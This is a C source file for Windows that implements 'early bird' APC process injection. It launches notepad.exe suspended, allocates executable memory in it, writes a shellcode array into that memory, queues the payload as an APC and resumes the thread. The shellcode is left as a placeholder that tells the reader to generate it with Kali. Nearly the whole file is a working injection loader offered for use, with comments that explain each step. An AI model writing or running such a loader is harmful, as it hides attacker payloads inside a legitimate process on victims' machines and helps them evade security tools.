#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Payload in bytes
unsigned char myPayload[] = 
<generate your shellcode from kali and paste it here>




int main() {

  DWORD myPayloadLen = sizeof(myPayload);

  // Create a 64-bit process:
  STARTUPINFO startupInfo = { sizeof(startupInfo) };
  PROCESS_INFORMATION processInfo = { 0 };
  HANDLE processHandle, threadHandle;

CreateProcessA(  "C:\\Windows\\System32\\notepad.exe",  NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL,&startupInfo, &processInfo  );

  // Allow time to start/initialize.
  WaitForSingleObject(processInfo.hProcess, 30000);
processHandle = processInfo.hProcess;
threadHandle = processInfo.hThread;

  // Allocate memory for payload
LPVOID  PayloadMem = VirtualAllocEx(processHandle, NULL, myPayloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  // Write payload to allocated memory
  WriteProcessMemory(processHandle, PayloadMem, myPayload, myPayloadLen, NULL);

  // Inject into the suspended thread.
  
  //casts the payload memory address as a function
  PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)PayloadMem;   
  //Uses APC (Asynchronous Procedure Call) to queue that function (your payload) to run on the suspended thread.
  QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, (ULONG_PTR)NULL);        

  // Resume the suspended thread
  ResumeThread(threadHandle);

  return 0;
}
